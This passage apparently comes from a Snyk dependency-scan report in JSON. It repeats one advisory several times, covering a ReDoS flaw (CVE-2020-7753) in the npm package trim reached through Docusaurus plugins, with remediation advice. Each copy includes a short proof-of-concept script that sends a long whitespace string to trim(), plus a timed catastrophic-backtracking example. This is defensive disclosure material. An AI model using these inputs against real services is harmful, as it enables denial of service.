of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-debug@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-analytics@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-gtag@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site 